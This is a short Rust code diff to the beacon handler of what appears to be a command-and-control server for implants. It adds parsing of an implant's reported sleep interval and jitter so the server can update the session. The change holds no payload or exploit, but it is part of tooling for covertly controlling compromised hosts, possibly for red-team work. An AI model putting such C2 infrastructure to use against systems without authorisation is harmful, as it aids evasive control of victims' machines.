@@ -606,6 +606,27 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
         {
             tracing::warn!("Beacon: failed to complete task {}: {e}", tr.task_id);
         }
+
+        // Parse sleep task results to update session sleep config.
+        // The implant returns "interval=30s jitter=15%" for sleep tasks.
+        if success && tr.result.contains("interval=") {
+            let mut interval = 0u32;
+            let mut jitter = 0u32;
+            for part in tr.result.split_whitespace() {
+                if let Some(val) = part.strip_prefix("interval=").and_then(|s| s.strip_suffix('s')) {
+                    interval = val.parse().unwrap_or(0);
+                }
+                if let Some(val) = part.strip_prefix("jitter=").and_then(|s| s.strip_suffix('%')) {
+                    jitter = val.parse().unwrap_or(0);
+                }
+            }
+            if interval > 0 {
+                let _ = state
+                    .session_manager
+                    .update_sleep_config(&sid, interval, jitter)
+                    .await;
+            }
+        }
     }
 
     // Fetch pending tasks
